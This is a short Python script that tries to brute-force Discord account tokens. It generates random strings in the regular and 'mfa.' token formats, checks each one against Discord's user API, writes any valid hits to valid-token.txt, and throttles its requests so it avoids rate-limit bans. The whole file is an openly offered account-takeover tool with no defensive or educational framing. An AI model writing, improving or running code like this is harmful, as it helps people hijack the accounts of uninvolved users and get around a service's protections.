# whosaddidix?#1400 luvs you

import random
import string
import time

import requests
from colorama import Fore, Style

attempts_per_second = 7 # Keep low or you wil get IP banned (Max 16-17) | See: https://discord.com/developers/docs/topics/rate-limits
    
def getheaders(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
    if token:
        headers.update({"Authorization": token})
    return headers

def mfa_crack():
    token = (f"mfa.{(''.join(random.choice(string.hexdigits + '-_') for _ in range(84)))}")
    
    r = requests.get(
        'https://discord.com/api/v9/users/@me',
        headers=getheaders(token))
    
    if r.status_code == 200:
        print(Fore.GREEN + f"- Valid Token. ({token}) | [{r.status_code}] | (Written to file)\n")   
        with open("valid-token.txt", "a") as f:
            f.write(f"\n{token}\n")   
             
    elif r.status_code == 401:
        print(Fore.RED + f"- Invalid Token. ({token}) | [{r.status_code}]\n")
        
    elif r.status_code == 429:
        print(Fore.YELLOW + f"- Rate limit exceded!\n")
        exit()
    
    else:
        print(Fore.YELLOW + f"Unknown error code thrown. Exiting . . . | [{r.status_code}]")
        exit()

def reg_crack():
    token = (f"{(''.join(random.choice(string.hexdigits) for _ in range(24)))}.{(''.join(random.choice(string.hexdigits) for _ in range(6)))}.{(''.join(random.choice(string.hexdigits + '-_') for _ in range(27)))}")
    
    r = requests.get(
        'https://discord.com/api/v9/users/@me',
        headers=getheaders(token))
    
    if r.status_code == 200:
        print(Fore.GREEN + f"- Valid Token. ({token}) | [{r.status_code}] | (Written to file)\n")    
        with open("valid-token.txt", "a") as f:
            f.write(f"\n{token}\n")    
        
    elif r.status_code == 401:
        print(Fore.RED + f"- Invalid Token. ({token}) | [{r.status_code}]\n")
        
    elif r.status_code == 429:
        print(Fore.YELLOW + f"- Rate limit exceded!\n")
        exit()
    
    else:
        print(Fore.YELLOW + f"Unknown code thrown. Exiting . . . [{r.status_code}]")
        exit()
    
def main():
    print("made by whosaddidix?#1400\nhttps://github.com/addi00000/ \n")
    delay = (1 / attempts_per_second)
    print(f"Delay (seconds): {delay}\nAttempts per second: {attempts_per_second}\n")
    choice = str(input("[1] Non MFA tokens (quicker to crack)\n[2] MFA tokens (longer to crack)\n>>> "))
    
    if choice == '1':
        while True:
            reg_crack()   
            time.sleep(delay)
            
    if choice == '2':
        while True:
            mfa_crack()   
            time.sleep(delay)

            
    else:
        exit()


if __name__ == "__main__":
    f = open("valid-token.txt", "w")
    
    try: main()
    except KeyboardInterrupt: 
        print(Style.RESET_ALL + '\n\nKeyboardInterrupt\nClosing . . .')
